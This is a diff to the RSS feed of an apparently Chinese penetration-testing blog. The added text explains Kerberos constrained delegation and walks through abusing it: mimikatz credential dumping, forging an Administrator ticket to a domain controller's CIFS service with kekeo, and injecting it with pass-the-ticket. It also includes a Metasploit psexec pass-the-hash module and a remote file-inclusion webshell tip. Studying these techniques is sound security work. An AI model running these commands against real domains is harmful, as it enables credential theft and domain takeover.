+			srcset=&#34;https://coollllllll.github.io/p/intranet-13/image-20220313170602409_hu6cd6bf83e00028a0daf95b4c51005530_169600_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/intranet-13/image-20220313170602409_hu6cd6bf83e00028a0daf95b4c51005530_169600_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			&gt;
+	&lt;/a&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;S4U2self&lt;/strong&gt;：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;用户向 service1 发送请求。用户已通过身份验证，但 service1 没有用户的授权数据。通常，这是由于身份验证是通过 Kerberos 以外的其他方式验证的。&lt;/li&gt;
+&lt;li&gt;通过 S4U2self 扩展以用户的名义向 KDC 请求用于访问 service1 的 ST1。&lt;/li&gt;
+&lt;li&gt;KDC 返回给 service1 一个用于用户验证 service1 的 ST1，该 ST1 可能包含用户的授权数据。&lt;/li&gt;
+&lt;li&gt;service1 可以使用 ST 中的授权数据来满足用户的请求，然后响应用户。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;尽管 S4U2self 向 service1 提供有关用户的信息，但 S4U2self 不允许 service1 代表用户发出其他服务的请求，这时候就轮到 S4U2proxy 发挥作用了。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;S4U2proxy&lt;/strong&gt;:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;用户向 service1 发送请求，service1 需要以用户身份访问 service2 上的资源。&lt;/li&gt;
+&lt;li&gt;service1 以用户的名义向 KDC 请求用户访问 service 2的 ST2。&lt;/li&gt;
+&lt;li&gt;如果请求中包含 PAC，则 KDC 通过检查 PAC 的签名数据来验证 PAC ，如果 PAC 有效或不存在，则 KDC 返回 ST2 给 service1，但存储在 ST2 的 cname 和 crealm 字段中的客户端身份是用户的身份，而不是 service1 的身份。&lt;/li&gt;
+&lt;li&gt;service1 使用 ST2 以用户的名义向 service2 发送请求，并判定用户已由 KDC 进行身份验证。&lt;/li&gt;
+&lt;li&gt;service2 响应步骤 8 的请求。&lt;/li&gt;
+&lt;li&gt;service1 响应用户对步骤 5 中的请求。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;当被设置为&lt;code&gt;约束性委派&lt;/code&gt;时，其 &lt;code&gt;userAccountControl&lt;/code&gt; 属性包含 &lt;code&gt;TRUSTED_TO_AUTH_FOR_DELEGATION(T2A4D)&lt;/code&gt;，且 &lt;code&gt;msDS-AllowedToDelegateTo&lt;/code&gt; 属性会被设置为&lt;strong&gt;某些特定协议&lt;/strong&gt;。&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 416; 
+			flex-basis: 1000px&#34;
+	&gt;
+	&lt;a href=&#34;https://coollllllll.github.io/p/intranet-13/image-20220313145712428.png&#34; data-size=&#34;1538x369&#34;&gt;
+		&lt;img src=&#34;https://coollllllll.github.io/p/intranet-13/image-20220313145712428.png&#34;
+			width=&#34;1538&#34;
+			height=&#34;369&#34;
+			srcset=&#34;https://coollllllll.github.io/p/intranet-13/image-20220313145712428_hu4316763a24b0544558b0819cb9c944ec_461420_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/intranet-13/image-20220313145712428_hu4316763a24b0544558b0819cb9c944ec_461420_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			&gt;
+	&lt;/a&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;注意：&lt;/p&gt;
+&lt;p&gt;如果 AD 中将用户标记为“帐户敏感且无法委派”，则无法模拟其身份。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h3 id=&#34;实战-1&#34;&gt;实战&lt;/h3&gt;
+&lt;h4 id=&#34;约束委派查找&#34;&gt;约束委派查找&lt;/h4&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;adfind&lt;/strong&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;strong&gt;查询约束委派的主机&lt;/strong&gt;：&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;AdFind.exe -b &amp;quot;DC=pentest,DC=com&amp;quot; -f &amp;quot;(&amp;amp;(samAccountType=805306369)(msds-allowedtodelegateto=*))&amp;quot; cn distinguishedName msds-allowedtodelegateto
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 217; 
+			flex-basis: 522px&#34;
+	&gt;
+	&lt;a href=&#34;https://coollllllll.github.io/p/intranet-13/image-20220313172008723.png&#34; data-size=&#34;961x441&#34;&gt;
+		&lt;img src=&#34;https://coollllllll.github.io/p/intranet-13/image-20220313172008723.png&#34;
+			width=&#34;961&#34;
+			height=&#34;441&#34;
+			srcset=&#34;https://coollllllll.github.io/p/intranet-13/image-20220313172008723_hua917f571d043ac5dd3f7b33f723f8a91_132491_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/intranet-13/image-20220313172008723_hua917f571d043ac5dd3f7b33f723f8a91_132491_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			&gt;
+	&lt;/a&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;查询约束委派的用户&lt;/strong&gt;：&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;AdFind.exe -b &amp;quot;DC=pentest,DC=com&amp;quot; -f &amp;quot;(&amp;amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&amp;quot; cn distinguishedName msds-allowedtodelegateto
+&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;powerview&lt;/strong&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;strong&gt;查询约束委派的主机&lt;/strong&gt;：&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Get-DomainComputer -TrustedToAuth -Domain test.com -Properties distinguishedname,useraccountcontrol,msds-allowedtodelegateto
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;查询约束委派的用户&lt;/strong&gt;：&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Get-DomainUser –TrustedToAuth -domain qiyou.com -Properties distinguishedname,useraccountcontrol,msds-allowedtodelegateto|fl
+&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;利用&#34;&gt;利用&lt;/h4&gt;
+&lt;p&gt;已知在约束委派的情况下，服务用户只能获取某个用户或者主机的服务 ST，只能用模拟用户访问特定的服务，是无法获取用户的 TGT 的，如果能够获得到开启了约束委派的服务的用户的明文密码或者NTLM hash 就可以伪造 S4U 的请求，进而伪造服务用户以任意账户的权限访问服务的 ST。&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;抓取主机账户或服务账户的NTLM值 或 以其他渠道(kerberosating攻击)获取到服务账户密码&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;mimikatz.exe &amp;quot;privilege::debug&amp;quot; &amp;quot;sekurlsa::logonpasswords full&amp;quot; exit
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 244; 
+			flex-basis: 585px&#34;
+	&gt;
+	&lt;a href=&#34;https://coollllllll.github.io/p/intranet-13/image-20220313173322791.png&#34; data-size=&#34;920x377&#34;&gt;
+		&lt;img src=&#34;https://coollllllll.github.io/p/intranet-13/image-20220313173322791.png&#34;
+			width=&#34;920&#34;
+			height=&#34;377&#34;
+			srcset=&#34;https://coollllllll.github.io/p/intranet-13/image-20220313173322791_hu910f4ad60bc64db3bea655d57a5c07a2_142762_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/intranet-13/image-20220313173322791_hu910f4ad60bc64db3bea655d57a5c07a2_142762_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			&gt;
+	&lt;/a&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;申请TGT(如果已经有服务账户所在主机的权限，可以直接使用mimikatz从内存中把服务账户的TGT导出，从而省略申请TGT过程)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;kekeo.exe 
+
+tgt::ask /user:win7$ /domain:pentest.com /ntlm:&amp;lt;抓取到的哈希&amp;gt;
+tgt::ask /user:win7$ /domain:pentest.com /password:123456
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 354; 
+			flex-basis: 850px&#34;
+	&gt;
+	&lt;a href=&#34;https://coollllllll.github.io/p/intranet-13/image-20220313173558350.png&#34; data-size=&#34;1031x291&#34;&gt;
+		&lt;img src=&#34;https://coollllllll.github.io/p/intranet-13/image-20220313173558350.png&#34;
+			width=&#34;1031&#34;
+			height=&#34;291&#34;
+			srcset=&#34;https://coollllllll.github.io/p/intranet-13/image-20220313173558350_hua65d29e8dc97382ceca4502be5127876_152634_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/intranet-13/image-20220313173558350_hua65d29e8dc97382ceca4502be5127876_152634_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			&gt;
+	&lt;/a&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;通过 TGT，&lt;strong&gt;伪造S4U请求&lt;/strong&gt;一张以 &lt;code&gt;Administrator&lt;/code&gt; 用户身份访问对应服务 2（&lt;strong&gt;DC 的 cifs 服务&lt;/strong&gt;）的 ST&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;tgs::s4u /tgt:TGT_win7$@PENTEST.COM_krbtgt~pentest.com@PENTEST.COM.kirbi /user:administrator@pentest.com /service:cifs/dc.pentest.com
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 211; 
+			flex-basis: 508px&#34;
+	&gt;
+	&lt;a href=&#34;https://coollllllll.github.io/p/intranet-13/image-20220313173703392.png&#34; data-size=&#34;1029x486&#34;&gt;
+		&lt;img src=&#34;https://coollllllll.github.io/p/intranet-13/image-20220313173703392.png&#34;
+			width=&#34;1029&#34;
+			height=&#34;486&#34;
+			srcset=&#34;https://coollllllll.github.io/p/intranet-13/image-20220313173703392_hu8fc540308c8f69f6d52dd2721b6d8cb1_301206_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/intranet-13/image-20220313173703392_hu8fc540308c8f69f6d52dd2721b6d8cb1_301206_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			&gt;
+	&lt;/a&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;S4U2Self&lt;/code&gt;获取到的 ST1 以及 &lt;code&gt;S4U2Proxy&lt;/code&gt; 获取到的 DC CIFS 服务的 ST2 会保存在当前目录下：&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 664; 
+			flex-basis: 1594px&#34;
+	&gt;
+	&lt;a href=&#34;https://coollllllll.github.io/p/intranet-13/image-20220313173749451.png&#34; data-size=&#34;631x95&#34;&gt;
+		&lt;img src=&#34;https://coollllllll.github.io/p/intranet-13/image-20220313173749451.png&#34;
+			width=&#34;631&#34;
+			height=&#34;95&#34;
+			srcset=&#34;https://coollllllll.github.io/p/intranet-13/image-20220313173749451_hu2950955962decbe43846c10d8088d13f_88135_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/intranet-13/image-20220313173749451_hu2950955962decbe43846c10d8088d13f_88135_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			&gt;
+	&lt;/a&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;mimikatz 注入ST2到当前会话&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;kerberos::ptt TGS_administrator@pentest.com@PENTEST.COM_cifs~dc.pentest.com@PENTEST.COM.kirbi
+&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;委派服务受限&#34;&gt;委派服务受限&lt;/h4&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 264; 
+			flex-basis: 635px&#34;
+	&gt;
+	&lt;a href=&#34;https://coollllllll.github.io/p/intranet-13/image-20220313174247259.png&#34; data-size=&#34;643x243&#34;&gt;
+		&lt;img src=&#34;https://coollllllll.github.io/p/intranet-13/image-20220313174247259.png&#34;
+			width=&#34;643&#34;
+			height=&#34;243&#34;
+			srcset=&#34;https://coollllllll.github.io/p/intranet-13/image-20220313174247259_hueb4a805464d01e767f6ccc3f1935e16a_88946_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/intranet-13/image-20220313174247259_hueb4a805464d01e767f6ccc3f1935e16a_88946_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			&gt;
+	&lt;/a&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;当允许的服务不是CIFS服务，可以在 hex 模式下修改 ST2，将 time 修改为 cifs，即可通过 smbexec 执行命令。&lt;/p&gt;
 </description>
         </item>
         <item>
@@ -787,7 +2452,9 @@ lsadump::lsa /patch
 &lt;p&gt;工作组环境下，会受上述注册表两值的影响；&lt;/p&gt;
 &lt;p&gt;而在域环境下不受影响。&lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;h2 id=&#34;补丁-kb2871997&#34;&gt;补丁-KB2871997&lt;/h2&gt;
+&lt;h3 id=&#34;msf-中的-pth&#34;&gt;MSF 中的 PTH&lt;/h3&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;exploit/windows/smb/psexec
+&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;补丁-kb2871997&#34;&gt;补丁-KB2871997&lt;/h2&gt;
 &lt;h3 id=&#34;目的&#34;&gt;目的&lt;/h3&gt;
 &lt;p&gt;阻止使用本地账户网络登录和远程交互式登录到一台加入到域内服务器的机器上。&lt;/p&gt;
 &lt;h3 id=&#34;修复结果&#34;&gt;修复结果&lt;/h3&gt;
@@ -1862,7 +3529,7 @@ lsadump::lsa /patch //通过转储lsass.exe进程对散列值进行dump
 &lt;/figure&gt;&lt;/p&gt;
 &lt;blockquote&gt;
 &lt;p&gt;域本地组直接对应资源。一个用户加入域中，会被分配至某个全局组；而域本地组成员一般是全局组，全局组成员才是用户。&lt;/p&gt;
-&lt;p&gt;通用组比较特殊，只存在于森林的根域中，所以其成员只能是根域的全局组；同时，由于通用组作用范围为森林内部的所有域，所以当作用于特定域(例如下图中的A域)时，该通用组又隶属于A域的某个域本地组，得以访问A域的资源。&lt;/p&gt;
+&lt;p&gt;通用组比较特殊，&lt;strong&gt;只存在于森林的根域中&lt;/strong&gt;，所以其成员只能是根域的全局组；同时，由于通用组作用范围为森林内部的所有域，所以当作用于特定域(例如下图中的A域)时，该通用组又隶属于A域的某个域本地组，得以访问A域的资源。&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;p&gt;&lt;figure 
 	
@@ -1876,6 +3543,23 @@ lsadump::lsa /patch //通过转储lsass.exe进程对散列值进行dump
 			width=&#34;687&#34;
 			height=&#34;502&#34;
 			srcset=&#34;https://coollllllll.github.io/p/intranet-1/image-20220122181734194_hub712d4de5a76ddefea508c498a485e0e_117153_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/intranet-1/image-20220122181734194_hub712d4de5a76ddefea508c498a485e0e_117153_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			&gt;
+	&lt;/a&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 122; 
+			flex-basis: 293px&#34;
+	&gt;
+	&lt;a href=&#34;https://coollllllll.github.io/p/intranet-1/image-20220312225632615.png&#34; data-size=&#34;1168x954&#34;&gt;
+		&lt;img src=&#34;https://coollllllll.github.io/p/intranet-1/image-20220312225632615.png&#34;
+			width=&#34;1168&#34;
+			height=&#34;954&#34;
+			srcset=&#34;https://coollllllll.github.io/p/intranet-1/image-20220312225632615_hu499e9b0edb0f1c3c7cef82dd5ae683f6_675283_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/intranet-1/image-20220312225632615_hu499e9b0edb0f1c3c7cef82dd5ae683f6_675283_1024x0_resize_box_3.png 1024w&#34;
 			loading=&#34;lazy&#34;
 			&gt;
 	&lt;/a&gt;
@@ -4746,7 +6430,10 @@ Linux：
 &lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;[http|https|ftp]://www.test.com/shell.txt
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;若后缀名写死，可以用 ? 绕过:&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;//www.test.com/shell.txt?a
-&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;伪协议&#34;&gt;伪协议&lt;/h3&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;blockquote&gt;
+&lt;p&gt;如果是包含远程服务器上的PHP文件，那么得到的是被远程服务器解析过的PHP，所以在写一句话木马的时候就不要做成.php的文件，一般包含.txt的文件&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h3 id=&#34;伪协议&#34;&gt;伪协议&lt;/h3&gt;
 &lt;h4 id=&#34;file&#34;&gt;file://&lt;/h4&gt;
 &lt;p&gt;一般用来读本地文件：&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;file://文件的绝对路径
